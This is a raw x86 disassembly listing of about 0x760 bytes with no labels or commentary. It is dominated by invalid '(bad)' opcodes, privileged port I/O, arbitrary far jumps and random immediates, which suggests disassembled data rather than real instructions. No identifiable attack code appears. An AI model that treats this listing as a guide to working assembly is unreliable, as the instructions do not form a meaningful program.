  40e16e:	(bad)  [ebx+0x20]
  40e171:	xchg   DWORD PTR [edx-0x16],ecx
  40e174:	popa   
  40e175:	mov    ah,0xdf
  40e177:	sbb    edx,DWORD PTR [ecx-0xc0f820]
  40e17d:	in     al,dx
  40e17e:	push   esp
  40e17f:	shl    BYTE PTR [esi+eiz*1],1
  40e182:	or     BYTE PTR [eax-0x25],ah
  40e185:	in     eax,dx
  40e186:	jo     0x40e19c
  40e188:	pop    ss
  40e189:	std    
  40e18a:	fdivr  DWORD PTR [ecx]
  40e18c:	add    esp,0xffffffa5
  40e18f:	shl    DWORD PTR [esi+0x6c],cl
  40e192:	jnp    0x40e161
  40e194:	pop    ebx
  40e195:	popa   
  40e196:	xor    bl,dl
  40e198:	lea    edi,[ebx]
  40e19a:	add    BYTE PTR [ebp-0xe],dh
  40e19d:	pop    ebp
  40e19e:	mov    eax,ds:0xf3fb8b66
  40e1a3:	dec    esp
  40e1a4:	popf   
  40e1a5:	add    dh,BYTE PTR [edi+0x5]
  40e1a8:	mov    ds:0xbf2ecfd4,eax
  40e1ad:	(bad)  
  40e1ae:	out    0xd4,eax
  40e1b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1b1:	(bad)  
  40e1b2:	out    dx,eax
  40e1b3:	shr    BYTE PTR [edx+0x32202ea2],1
  40e1b9:	(bad)  
  40e1bb:	pushf  
  40e1bc:	jmp    0x2246:0x1023d869
  40e1c3:	scas   eax,DWORD PTR es:[edi]
  40e1c4:	in     al,0xab
  40e1c6:	and    ecx,eax
  40e1c8:	jne    0x40e152
  40e1ca:	mov    dl,0xbf
  40e1cc:	in     al,0x73
  40e1ce:	pop    ecx
  40e1cf:	call   0x914:0x1b277379
  40e1d6:	daa    
  40e1d7:	sub    bl,BYTE PTR [edx+0x24df1f8a]
  40e1dd:	repnz xchg ebx,eax
  40e1df:	mov    al,ds:0x4b21f700
  40e1e4:	int3   
  40e1e5:	xchg   esp,eax
  40e1e6:	repnz enter 0x49a5,0x8c
  40e1eb:	ror    DWORD PTR [ebp-0x6e0455b8],cl
  40e1f1:	imul   DWORD PTR [edx-0x59]
  40e1f4:	adc    al,0xd2
  40e1f6:	jno    0x40e185
  40e1f8:	out    dx,al
  40e1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1fa:	jle    0x40e204
  40e1fc:	lea    ecx,[ebx-0x55]
  40e1ff:	call   DWORD PTR [edi-0x6b]
  40e202:	neg    DWORD PTR [ecx]
  40e204:	and    edi,0xea50bd7e
  40e20a:	dec    edi
  40e20b:	and    BYTE PTR [edi],0x9d
  40e20e:	inc    edi
  40e20f:	out    dx,eax
  40e210:	stos   BYTE PTR es:[edi],al
  40e211:	and    DWORD PTR [ebx-0x7a1c25c],edx
  40e217:	mov    esi,0x77f04a70
  40e21c:	imul   ebx,DWORD PTR [ebp+0x64b5279a],0xffffffeb
  40e223:	jo     0x40e1f2
  40e225:	jae    0x40e256
  40e227:	jo     0x40e235
  40e229:	(bad)  
  40e22a:	popf   
  40e22b:	js     0x40e28a
  40e22d:	aaa    
  40e22e:	cmp    DWORD PTR [esi],esi
  40e230:	pop    ds
  40e231:	imul   ebx,DWORD PTR [eax],0x1c
  40e234:	lods   al,BYTE PTR ds:[esi]
  40e235:	test   esp,edi
  40e237:	pop    es
  40e238:	iret   
  40e239:	popa   
  40e23a:	test   al,0x96
  40e23c:	push   es
  40e23d:	jae    0x40e1d9
  40e23f:	stos   DWORD PTR es:[edi],eax
  40e240:	lods   al,BYTE PTR ss:[esi]
  40e242:	xor    bh,BYTE PTR [edi+ebp*8-0x17]
  40e246:	xchg   ebx,eax
  40e247:	fistp  WORD PTR [esp+edi*2+0x2]
  40e24b:	or     eax,0x8a551a
  40e250:	cmp    ah,ah
  40e252:	or     al,BYTE PTR [edx-0x43]
  40e255:	xchg   esi,eax
  40e256:	push   edi
  40e257:	dec    edi
  40e258:	pop    esi
  40e259:	jecxz  0x40e26b
  40e25b:	mov    ebp,0xcbd3ffc
  40e260:	sti    
  40e261:	shl    BYTE PTR [eax-0x2f],1
  40e264:	jp     0x40e275
  40e266:	rcr    BYTE PTR [ebx],1
  40e268:	clc    
  40e269:	and    cl,0x68
  40e26c:	sar    BYTE PTR [ebp-0x601653e9],1
  40e272:	and    DWORD PTR [edx],0xa1786cdb
  40e278:	lea    ebp,[ebx+0x67]
  40e27b:	les    ecx,FWORD PTR [edi+0x3b]
  40e27e:	les    ebp,FWORD PTR [edx]
  40e280:	jg     0x40e26b
  40e282:	repnz xor al,BYTE PTR [edx-0x18]
  40e286:	les    edi,FWORD PTR [edi-0x51]
  40e289:	or     bh,ah
  40e28b:	sbb    al,0xcc
  40e28d:	lods   al,BYTE PTR ds:[esi]
  40e28e:	test   eax,0xd320be81
  40e293:	out    0x4b,al
  40e295:	call   0x8083:0x1b420d4e
  40e29c:	pusha  
  40e29d:	sbb    edx,DWORD PTR [esi-0x42]
  40e2a0:	scas   eax,DWORD PTR es:[edi]
  40e2a1:	pop    esp
  40e2a2:	js     0x40e31f
  40e2a4:	not    BYTE PTR [ebp+0x41]
  40e2a7:	addr16 mov ebx,0x1fa90ebd
  40e2ad:	push   0xd20446f4
  40e2b2:	xor    al,0x5b
  40e2b4:	imul   ebx,DWORD PTR [ecx-0x59e210cc],0xffffffd1
  40e2bb:	imul   eax,DWORD PTR [eax+0x5c81bc2e],0xc5e87d04
  40e2c5:	arpl   WORD PTR [esi-0x6c],si
  40e2c8:	dec    esi
  40e2c9:	ret    
  40e2ca:	shr    BYTE PTR [esi+esi*2+0x2457f727],cl
  40e2d1:	sahf   
  40e2d2:	mov    ebx,edi
  40e2d4:	lock shl BYTE PTR ds:0xf4fe19e5,0xc2
  40e2dc:	dec    ebx
  40e2dd:	cwde   
  40e2de:	adc    BYTE PTR [esp+esi*4+0x17],0xe0
  40e2e3:	adc    eax,0xa997e610
  40e2e8:	outs   dx,DWORD PTR ds:[esi]
  40e2e9:	cmp    BYTE PTR [edx-0x4a],bh
  40e2ec:	ret    
  40e2ed:	cmp    esp,DWORD PTR [esi]
  40e2ef:	push   0xffffff90
  40e2f1:	dec    eax
  40e2f2:	out    0xdc,al
  40e2f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2f5:	adc    ebp,eax
  40e2f7:	xchg   cl,dl
  40e2f9:	fst    DWORD PTR [edx]
  40e2fb:	nop
  40e2fc:	mov    ds:0x773f9c5a,eax
  40e301:	and    DWORD PTR [esi+0x71],edx
  40e304:	outs   dx,BYTE PTR ds:[esi]
  40e305:	xor    al,0xc8
  40e307:	lock ins BYTE PTR es:[edi],dx
  40e309:	div    ch
  40e30b:	mov    dh,0x3d
  40e30d:	inc    edx
  40e30e:	inc    DWORD PTR [edi+0x6cd29cdf]
  40e314:	mov    bl,0x5c
  40e316:	jge    0x40e33f
  40e318:	push   esi
  40e319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e31a:	jb     0x40e302
  40e31c:	sub    DWORD PTR [edi+0x79],ecx
  40e31f:	(bad)  
  40e321:	outs   dx,DWORD PTR ds:[esi]
  40e322:	push   eax
  40e323:	leave  
  40e324:	pusha  
  40e325:	fisubr WORD PTR [edx+0x3b]
  40e328:	ja     0x40e3a0
  40e32a:	pop    edx
  40e32b:	xlat   BYTE PTR ds:[ebx]
  40e32c:	push   edx
  40e32d:	xlat   BYTE PTR ds:[ebx]
  40e32e:	mov    dl,0xb
  40e330:	mov    tr2,edx
  40e333:	fstp   TBYTE PTR [ecx+edx*2+0x9]
  40e337:	lds    esi,FWORD PTR [edx+esi*1+0x1d]
  40e33b:	test   al,0x84
  40e33d:	outs   dx,BYTE PTR ds:[esi]
  40e33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e33f:	imul   edi,DWORD PTR [eax-0x632c0109],0x6a
  40e346:	dec    esi
  40e347:	shr    BYTE PTR [edi],cl
  40e349:	aaa    
  40e34a:	mov    ebp,0x1f98345
  40e34f:	ins    DWORD PTR es:[edi],dx
  40e350:	or     bh,BYTE PTR [ebp-0x41]
  40e353:	xor    al,0x98
  40e355:	jae    0x40e375
  40e357:	pop    ebp
  40e358:	xchg   eax,edx
  40e35a:	mov    dl,0x69
  40e35c:	loop   0x40e38f
  40e35e:	aas    
  40e35f:	test   al,ch
  40e361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e362:	bound  esi,QWORD PTR [ecx-0x68]
  40e365:	pop    ecx
  40e366:	clc    
  40e367:	dec    ebx
  40e368:	pusha  
  40e369:	xchg   ebx,eax
  40e36a:	and    ch,0x9b
  40e36d:	mov    ss,edx
  40e36f:	(bad)  
  40e370:	repz inc ebp
  40e372:	shr    cl,1
  40e374:	adc    esp,ebp
  40e376:	repz ficom DWORD PTR [ebp-0x50]
  40e37a:	xchg   ebx,eax
  40e37b:	rcl    BYTE PTR [edi],cl
  40e37d:	das    
  40e37e:	pop    ecx
  40e37f:	imul   edi,esp,0x57
  40e382:	pop    edx
  40e383:	std    
  40e384:	and    edx,DWORD PTR [edx+0x4058ba98]
  40e38a:	sbb    al,0xae
  40e38c:	icebp  
  40e38d:	sbb    esp,DWORD PTR [edx-0x7126338d]
  40e393:	test   al,0xec
  40e395:	into   
  40e396:	outs   dx,BYTE PTR ds:[esi]
  40e397:	jnp    0x40e394
  40e399:	cwde   
  40e39a:	ror    BYTE PTR [edi-0x2af3abc6],1
  40e3a0:	fwait
  40e3a1:	dec    esp
  40e3a2:	popa   
  40e3a3:	fist   WORD PTR [ebx-0x5e30c4d]
  40e3a9:	xor    DWORD PTR [edx-0x5f],ecx
  40e3ac:	jnp    0x40e3c5
  40e3ae:	mov    BYTE PTR [ebp-0x2a],ah
  40e3b1:	cdq    
  40e3b2:	and    dl,BYTE PTR [esp+eax*2-0x6855fad1]
  40e3b9:	les    ecx,FWORD PTR [esi-0x7b]
  40e3bc:	retf   0xfec2
  40e3bf:	or     eax,0x5cbd9a66
  40e3c4:	sbb    DWORD PTR [edx-0x26],0xffffffc2
  40e3c8:	popf   
  40e3c9:	ss and al,0x3d
  40e3cc:	xchg   DWORD PTR [ebp+0x7f],esp
  40e3cf:	fadd   QWORD PTR [ecx-0x6a842401]
  40e3d5:	shr    al,0x9b
  40e3d8:	sub    ebp,DWORD PTR [ebx]
  40e3da:	mov    edx,0x56774c5c
  40e3df:	popa   
  40e3e0:	imul   BYTE PTR [ebx+ebx*2]
  40e3e3:	ds ret 0xa67
  40e3e7:	sbb    al,0xac
  40e3e9:	mov    al,ds:0x533e17ad
  40e3ee:	and    ah,cl
  40e3f0:	sbb    eax,DWORD PTR [ecx]
  40e3f2:	dec    edx
  40e3f3:	or     edx,ecx
  40e3f5:	gs inc edx
  40e3f7:	mov    dl,0x7d
  40e3f9:	imul   edi,DWORD PTR [ebp+ecx*8-0x2b83825e],0xa3d2b3f2
  40e404:	mov    ds:0x7f20ac95,al
  40e409:	rcr    cl,1
  40e40b:	call   0x20cff8f6
  40e410:	push   cs
  40e411:	call   0x365d:0x2fe9bddc
  40e418:	jno    0x40e3fe
  40e41a:	mov    ds:0x995357f4,eax
  40e41f:	in     al,0xea
  40e421:	adc    edx,DWORD PTR [eax-0x1a9a2e72]
  40e427:	pop    ebp
  40e428:	inc    esp
  40e429:	dec    edi
  40e42a:	mov    ch,0x70
  40e42c:	pop    ss
  40e42d:	cmp    DWORD PTR [eax],0x963de3cf
  40e433:	ins    DWORD PTR es:[edi],dx
  40e434:	stc    
  40e435:	cmp    DWORD PTR [esi+eax*8],edi
  40e438:	std    
  40e439:	or     eax,0x28e5cae7
  40e43e:	push   ss
  40e43f:	sub    ecx,edi
  40e441:	add    edx,DWORD PTR [eax]
  40e443:	adc    al,0x5
  40e445:	test   DWORD PTR ds:0x5f27d97c,0x57e7ed79
  40e44f:	(bad)  
  40e450:	rcl    DWORD PTR [ecx],cl
  40e452:	push   cs
  40e453:	cmc    
  40e454:	push   ds
  40e455:	jbe    0x40e47a
  40e457:	mov    ecx,DWORD PTR ds:0xc66334ab
  40e45d:	out    0xa6,al
  40e45f:	and    al,0xd
  40e461:	lock jnp 0x40e4cc
  40e464:	pop    ecx
  40e465:	scas   eax,DWORD PTR es:[edi]
  40e466:	mov    si,0x1ac4
  40e46a:	pop    es
  40e46b:	stc    
  40e46c:	push   ecx
  40e46d:	mov    eax,0xae31c91c
  40e472:	mov    cl,0x22
  40e474:	shl    edx,1
  40e476:	inc    esi
  40e477:	mov    edx,0x3b03a811
  40e47c:	adc    al,0xaf
  40e47e:	push   ds
  40e47f:	adc    BYTE PTR [eax],ah
  40e481:	idiv   DWORD PTR [ebx+eax*2-0x9]
  40e485:	adc    ebp,ecx
  40e487:	sub    al,0x44
  40e489:	lahf   
  40e48a:	aaa    
  40e48b:	mov    cl,0x3f
  40e48d:	imul   esp,DWORD PTR [edx+ecx*8-0x174a552f],0xfffffff2
  40e495:	inc    ebp
  40e496:	push   esp
  40e497:	add    al,0x79
  40e499:	mov    ecx,0x981e6f21
  40e49e:	cdq    
  40e49f:	addr16 std 
  40e4a1:	pop    ss
  40e4a2:	add    bh,dh
  40e4a4:	and    DWORD PTR [eax+ecx*2+0x1d],ebp
  40e4a8:	mov    ecx,0xaf87a8ad
  40e4ad:	or     al,0x63
  40e4af:	xchg   ebp,eax
  40e4b0:	dec    ebp
  40e4b1:	xor    ecx,eax
  40e4b3:	or     al,0x35
  40e4b5:	fst    DWORD PTR [esp+ebx*1+0x2066490a]
  40e4bc:	mov    eax,0xad374f88
  40e4c1:	add    DWORD PTR [ecx],ebp
  40e4c3:	sub    DWORD PTR [eax-0x69],0xa8b05d93
  40e4ca:	dec    esp
  40e4cb:	jmp    0x15d6:0xc69d2ab7
  40e4d2:	cmc    
  40e4d3:	icebp  
  40e4d4:	sbb    BYTE PTR [ebx-0x772795ad],dl
  40e4da:	into   
  40e4db:	js     0x40e53e
  40e4dd:	ret    
  40e4de:	mov    ebx,0x653b5d5
  40e4e3:	les    edi,FWORD PTR [ebx+0x4022c24c]
  40e4e9:	sbb    BYTE PTR [ebp-0x77],al
  40e4ec:	jno    0x40e47d
  40e4ee:	jb     0x40e47f
  40e4f0:	sub    BYTE PTR [edi+edi*8],dh
  40e4f3:	pusha  
  40e4f4:	or     DWORD PTR [esi-0x72],0xb284e34e
  40e4fb:	retf   0x8577
  40e4fe:	sbb    cl,BYTE PTR [edi+esi*1-0x26e28009]
  40e505:	cmp    eax,0x2c66fd15
  40e50a:	cs inc eax
  40e50c:	mov    eax,0x50f5a530
  40e511:	mov    ebx,0x495c0118
  40e516:	or     esp,eax
  40e518:	push   edx
  40e519:	gs cld 
  40e51b:	ror    DWORD PTR [edx],cl
  40e51d:	cs dec eax
  40e51f:	cdq    
  40e520:	jbe    0x40e55c
  40e522:	mov    ch,0x8e
  40e524:	sub    ebp,DWORD PTR [esi]
  40e526:	in     eax,dx
  40e527:	in     eax,0x2c
  40e529:	fwait
  40e52a:	cmp    ecx,DWORD PTR [ebp+0x61]
  40e52d:	test   DWORD PTR [edx],edx
  40e52f:	fisttp WORD PTR gs:[edx-0x440c757a]
  40e536:	nop
  40e537:	pop    ecx
  40e538:	aas    
  40e539:	add    eax,0x57ce401b
  40e53e:	loop   0x40e543
  40e540:	nop
  40e541:	inc    ebx
  40e542:	mov    eax,ds:0x8145909a
  40e547:	adc    ebp,DWORD PTR [esi-0x1d]
  40e54a:	fisttp WORD PTR es:[edi+0x3b]
  40e54e:	sub    al,0xdb
  40e550:	(bad)  
  40e551:	fcomp  DWORD PTR [esi-0x6654dcef]
  40e557:	pop    ebp
  40e558:	out    dx,eax
  40e559:	push   es
  40e55a:	fild   DWORD PTR [esi+eax*4+0x38a1ede9]
  40e561:	xor    al,0x98
  40e563:	dec    ebx
  40e564:	adc    eax,0x80230903
  40e569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e56a:	das    
  40e56b:	mov    bh,ah
  40e56d:	sub    al,0xa8
  40e56f:	sub    al,BYTE PTR [esi-0x744dc2ec]
  40e575:	xor    esi,DWORD PTR [edx]
  40e577:	div    DWORD PTR [edx+0x4e83a775]
  40e57d:	es lock and bh,al
  40e581:	sub    DWORD PTR [esp+ecx*8],ebp
  40e584:	seta   BYTE PTR [ebp-0x1c]
  40e588:	sar    DWORD PTR [ecx],0x5e
  40e58b:	add    al,0xee
  40e58d:	(bad)  
  40e58e:	pushf  
  40e58f:	mov    bl,0x67
  40e591:	xor    BYTE PTR [ebx+0x2f],ah
  40e594:	ss push 0x31
  40e597:	pushw  ss
  40e599:	push   0x1d455b96
  40e59e:	adc    al,ch
  40e5a0:	lods   eax,DWORD PTR ds:[esi]
  40e5a1:	fwait
  40e5a2:	sub    al,0xf0
  40e5a4:	xor    ebp,DWORD PTR [ebx-0xe36a014]
  40e5aa:	adc    eax,0xf484fc13
  40e5af:	rcl    dh,1
  40e5b1:	jmp    0x5c34:0x993394ef
  40e5b8:	xchg   al,bl
  40e5ba:	out    dx,eax
  40e5bb:	xor    eax,0x296d831a
  40e5c0:	pop    edi
  40e5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c2:	in     al,0xa1
  40e5c4:	enter  0xecf,0x5a
  40e5c8:	jmp    0x8050:0x8600e98c
  40e5cf:	fcom   QWORD PTR [ebx*4+0x147074fc]
  40e5d6:	inc    ebx
  40e5d7:	add    eax,edi
  40e5d9:	sub    BYTE PTR [edx],bh
  40e5db:	cli    
  40e5dc:	inc    esi
  40e5dd:	push   esp
  40e5de:	imul   edi,DWORD PTR [esi+0x10482595],0xffffff84
  40e5e5:	pop    eax
  40e5e6:	leave  
  40e5e7:	push   ecx
  40e5e8:	lds    eax,FWORD PTR [eax+edx*4]
  40e5eb:	ins    DWORD PTR es:[edi],dx
  40e5ec:	fs pop ecx
  40e5ee:	or     esp,esi
  40e5f0:	jmp    0x40e617
  40e5f2:	mov    fs,esp
  40e5f4:	mov    ch,0x57
  40e5f6:	mov    esp,0x3d250667
  40e5fb:	xor    eax,0xbfc47928
  40e600:	push   edx
  40e601:	(bad)  
  40e602:	mov    ah,0xbd
  40e604:	loopne 0x40e66f
  40e606:	adc    BYTE PTR [eax+0x664063c6],ch
  40e60c:	(bad)  [ebx-0x17c31683]
  40e612:	dec    ebx
  40e613:	add    al,0x28
  40e615:	(bad)  
  40e616:	lock sub DWORD PTR [ebx-0x1f],eax
  40e61a:	fdivr  QWORD PTR [ebx+0x60]
  40e61d:	daa    
  40e61e:	pop    edx
  40e61f:	jecxz  0x40e604
  40e621:	nop
  40e622:	fs jg  0x40e5ff
  40e625:	cs add al,0x9e
  40e628:	les    esi,FWORD PTR [esi-0x3a]
  40e62b:	or     al,0x35
  40e62d:	sbb    ecx,0xe
  40e630:	adc    DWORD PTR [ebp+eax*2+0x23],esp
  40e634:	jae    0x40e66c
  40e636:	pop    es
  40e637:	jmp    FWORD PTR [edi+0x71]
  40e63a:	pop    ds
  40e63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e63c:	gs sub al,0xd6
  40e63f:	mov    ebp,0xae96eca0
  40e644:	push   es
  40e645:	xchg   edi,eax
  40e646:	ins    DWORD PTR es:[edi],dx
  40e647:	and    eax,0xdb4bbf8d
  40e64c:	out    0x4d,al
  40e64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e64f:	js     0x40e600
  40e651:	clc    
  40e652:	popf   
  40e653:	xor    BYTE PTR [eax-0x4f],dl
  40e656:	jl     0x40e655
  40e658:	(bad)  
  40e659:	int    0x27
  40e65b:	mov    esi,0x95af95b4
  40e660:	push   ss
  40e661:	push   0xffffff99
  40e663:	sbb    ch,BYTE PTR [ecx+edi*2]
  40e666:	es sbb eax,0xe878fca0
  40e66c:	dec    eax
  40e66d:	fs mov bh,0xc5
  40e670:	pop    es
  40e671:	pop    es
  40e672:	neg    BYTE PTR [edx-0x53]
  40e675:	call   0xf5e544
  40e67a:	or     al,0xe6
  40e67c:	push   esi
  40e67d:	push   eax
  40e67e:	cmp    BYTE PTR [edi],al
  40e680:	enter  0xd226,0x3a
  40e684:	pushf  
  40e685:	xor    al,0x7f
  40e687:	jle    0x1d5ffc0c
  40e68d:	and    BYTE PTR [esi],dh
  40e68f:	not    BYTE PTR [esi]
  40e691:	ret    
  40e692:	(bad)  
  40e693:	ins    WORD PTR es:[edi],dx
  40e695:	xor    BYTE PTR [edx],0xf0
  40e698:	cs enter 0x34c1,0x60
  40e69d:	xor    al,0xfe
  40e69f:	js     0x40e649
  40e6a1:	addr16 mov dh,0x2c
  40e6a4:	pop    ss
  40e6a5:	test   al,0x86
  40e6a7:	test   al,0x4d
  40e6a9:	adc    DWORD PTR [esi+0x5115cce8],edx
  40e6af:	xchg   edx,eax
  40e6b0:	lds    esi,FWORD PTR [edi+0x68]
  40e6b3:	ret    0x98
  40e6b6:	mov    esi,0x33aa769
  40e6bb:	mov    ecx,0x1b359b8b
  40e6c0:	cmc    
  40e6c1:	icebp  
  40e6c2:	ins    BYTE PTR es:[edi],dx
  40e6c3:	adc    cl,BYTE PTR [ebp+0x54]
  40e6c6:	mov    eax,ds:0x39f3921b
  40e6cb:	out    dx,al
  40e6cc:	jno    0x40e6d2
  40e6ce:	fstp   TBYTE PTR [edi+0x2e1d7010]
  40e6d4:	out    dx,al
  40e6d5:	pop    esi
  40e6d6:	outs   dx,BYTE PTR ds:[esi]
  40e6d7:	in     al,dx
  40e6d8:	jno    0x40e68e
  40e6da:	sub    DWORD PTR [ecx],eax
  40e6dc:	cld    
  40e6dd:	lods   al,BYTE PTR ds:[esi]
  40e6de:	ss fucomip st,st(6)
  40e6e1:	aas    
  40e6e2:	call   0x7e3b7798
  40e6e7:	ret    0xa164
  40e6ea:	fiadd  DWORD PTR [esi-0xf]
  40e6ed:	arpl   cx,bp
  40e6ef:	test   DWORD PTR [edx+0x2c1e9bf4],0xf4076dbe
  40e6f9:	aas    
  40e6fa:	repz push edi
  40e6fc:	aam    0x7a
  40e6fe:	or     edi,edi
  40e700:	fadd   st(7),st
  40e702:	lods   al,BYTE PTR ds:[esi]
  40e703:	jmp    0xbfb0:0x3f9b741d
  40e70a:	sub    eax,0xbac7b8f2
  40e70f:	inc    DWORD PTR [eax+0x3625bc85]
  40e715:	cmp    eax,0x6b4fbed
  40e71a:	jmp    0xcf41:0x6ffe40c5
  40e721:	pushf  
  40e722:	das    
  40e723:	push   ss
  40e724:	add    eax,0x8ed55036
  40e729:	outs   dx,DWORD PTR ds:[esi]
  40e72a:	dec    ecx
  40e72b:	dec    edi
  40e72c:	dec    ebp
  40e72d:	xchg   edx,eax
  40e72e:	in     al,0xb8
  40e730:	scas   eax,DWORD PTR es:[edi]
  40e731:	adc    BYTE PTR [edi+0x17],ah
  40e734:	push   ecx
  40e735:	xchg   ebp,eax
  40e736:	in     eax,0x7d
  40e738:	cmp    eax,0x83285b01
  40e73d:	mov    edx,0x3bb78cdf
  40e742:	jmp    0x40e7b6
  40e744:	ins    BYTE PTR es:[edi],dx
  40e745:	aaa    
  40e746:	cmp    BYTE PTR [edi-0x6],0xe2
  40e74a:	add    eax,0x7316554e
  40e74f:	xor    ebx,esi
  40e751:	fcomp  DWORD PTR [edi+ebp*4-0x33]
  40e755:	imul   esi,edi,0x6a
  40e758:	jnp    0x40e772
  40e75a:	jno    0x40e7ad
  40e75c:	pop    es
  40e75d:	sbb    al,0xa2
  40e75f:	(bad)  
  40e760:	xchg   DWORD PTR [ecx],ebx
  40e762:	fidiv  DWORD PTR [ecx-0x63f8c08d]
  40e768:	stos   BYTE PTR es:[edi],al
  40e769:	fist   WORD PTR [ebx-0x21]
  40e76c:	popf   
  40e76d:	fsubp  st(0),st
  40e76f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e770:	ret    
  40e771:	repz pushw cs
  40e774:	push   0x6fdd6a2f
  40e779:	dec    esi
  40e77a:	or     eax,edx
  40e77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77d:	cmp    DWORD PTR [edi],0x59
  40e780:	push   esi
  40e781:	scas   al,BYTE PTR es:[edi]
  40e782:	dec    ecx
  40e783:	push   ebx
  40e784:	shr    DWORD PTR [ebp+0x3320c0ae],cl
  40e78a:	and    cl,ch
  40e78c:	xor    edi,DWORD PTR [ebx]
  40e78e:	dec    ebx
  40e78f:	inc    eax
  40e790:	mov    edx,0xcc32e854
  40e795:	dec    ebx
  40e796:	sub    BYTE PTR [ebx+eiz*4+0x6f6474a8],dh
  40e79d:	dec    edx
  40e79e:	ror    DWORD PTR [edi],0x2a
  40e7a1:	pop    edi
  40e7a2:	jnp    0x40e818
  40e7a4:	lea    edi,[bp+si+0x5b8b]
  40e7a9:	shl    BYTE PTR [eax-0x6d18e048],1
  40e7af:	(bad)  
  40e7b0:	loop   0x40e73c
  40e7b2:	jnp    0x40e805
  40e7b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7b5:	and    bh,BYTE PTR [edi+eax*4]
  40e7b8:	jle    0x40e7fe
  40e7ba:	dec    esp
  40e7bb:	mov    bl,0xab
  40e7bd:	dec    ecx
  40e7be:	nop
  40e7bf:	cmp    dh,BYTE PTR [ebp-0x2800d4c3]
  40e7c5:	dec    esi
  40e7c6:	in     ax,dx
  40e7c8:	xor    bl,bh
  40e7ca:	cld    
  40e7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7cc:	push   eax
  40e7cd:	gs xor al,0xd5
  40e7d0:	cwde   
  40e7d1:	jmp    0xea82:0x24f11ce1
  40e7d8:	(bad)  
  40e7d9:	pop    ecx
  40e7da:	or     BYTE PTR [edx+0x16a45b19],bh
  40e7e0:	repz cli 
  40e7e2:	cwde   
  40e7e3:	lahf   
  40e7e4:	pushf  
  40e7e5:	and    esi,ecx
  40e7e7:	xor    al,0xe9
  40e7e9:	nop
  40e7ea:	ds aam 0xe5
  40e7ed:	add    ch,bh
  40e7ef:	aam    0x84
  40e7f1:	sub    edx,DWORD PTR [esi+edx*8-0x4d660671]
  40e7f8:	adc    DWORD PTR [esi-0x34],ebx
  40e7fb:	lds    ebx,FWORD PTR [eax+0x9d961b4]
  40e801:	mov    eax,ds:0x5541287d
  40e806:	stc    
  40e807:	cmp    dl,dl
  40e809:	pop    ecx
  40e80a:	test   BYTE PTR [edx],0x6f
  40e80d:	push   esi
  40e80e:	dec    ebp
  40e80f:	mov    eax,ds:0x6a6e5fd1
  40e814:	fcmovu st,st(6)
  40e816:	jns    0x40e849
  40e818:	test   al,0x10
  40e81a:	mov    ecx,0xc1103f8c
  40e81f:	popaw  
  40e821:	outs   dx,DWORD PTR ds:[esi]
  40e822:	arpl   WORD PTR [ebx+ebx*2+0x588edfa0],sp
  40e829:	lods   al,BYTE PTR ds:[esi]
  40e82a:	ins    BYTE PTR es:[edi],dx
  40e82b:	mov    ds:0xdefa3695,eax
  40e830:	jnp    0x40e88a
  40e832:	sbb    BYTE PTR [ebx+0x20],dh
  40e835:	mov    bh,BYTE PTR [eax-0x6a83f660]
  40e83b:	cs push esp
  40e83d:	outs   dx,BYTE PTR ds:[esi]
  40e83e:	push   esp
  40e83f:	gs push ss
  40e841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e842:	int3   
  40e843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e844:	pop    ebp
  40e845:	inc    edi
  40e846:	and    al,0xf2
  40e848:	cmc    
  40e849:	xchg   esi,eax
  40e84a:	mov    ds,WORD PTR [edx]
  40e84c:	stos   BYTE PTR es:[edi],al
  40e84d:	in     eax,dx
  40e84e:	fsubrp st(2),st
  40e850:	mov    DWORD PTR [edx-0x5b5c1a68],ecx
  40e856:	sbb    BYTE PTR [ecx+eiz*4+0x8],ch
  40e85a:	sub    al,0xaa
  40e85c:	mov    dh,dl
  40e85e:	add    edx,0xb91b360a
  40e864:	pop    ebp
  40e865:	call   0x79774867
  40e86a:	mov    WORD PTR [ebx*4-0x7530d26d],es
  40e871:	mov    esi,0x7f10e96f
  40e876:	je     0x40e89b
  40e878:	adc    al,0xcf
  40e87a:	icebp  
  40e87b:	imul   ecx,ecx,0x64
  40e87e:	xchg   esi,eax
  40e87f:	cli    
  40e880:	popa   
  40e881:	push   ss
  40e882:	ins    BYTE PTR es:[edi],dx
  40e883:	imul   esi,DWORD PTR [eax+0x4b5ec243],0x55
  40e88a:	pop    ecx
  40e88b:	pushf  
  40e88c:	pop    esi
  40e88d:	loopne 0x40e878
  40e88f:	inc    edx
  40e890:	mov    ebp,DWORD PTR [ecx]
  40e892:	int    0xef
  40e894:	int    0xc
  40e896:	mov    dl,0x72
  40e898:	std    
  40e899:	pop    edx
  40e89a:	inc    esi
  40e89b:	jne    0x40e8c1
  40e89d:	popf   
  40e89e:	in     al,dx
  40e89f:	data16 aad 0x20
  40e8a2:	push   eax
  40e8a3:	popa   
  40e8a4:	xchg   ebx,eax
  40e8a5:	stc    
  40e8a6:	inc    esi
  40e8a7:	xor    dh,BYTE PTR [ecx]
  40e8a9:	pop    edx
  40e8aa:	xor    eax,0x21c607ab
  40e8af:	pop    esi
  40e8b0:	mov    ebx,0x6c9eecd2
  40e8b5:	rcl    BYTE PTR [ebx-0x6957169c],1
  40e8bb:	in     al,0x76
  40e8bd:	pushf  
  40e8be:	sti    
  40e8bf:	lea    ebp,[ebx+ebx*8]
  40e8c2:	je     0x40e8e2
  40e8c4:	ret    
  40e8c5:	test   al,0x99
  40e8c7:	xlat   BYTE PTR ds:[ebx]
  40e8c8:	inc    esi
  40e8c9:	and    eax,DWORD PTR [edi+0x5171f7f]
  40e8cf:	add    eax,0xb09487da
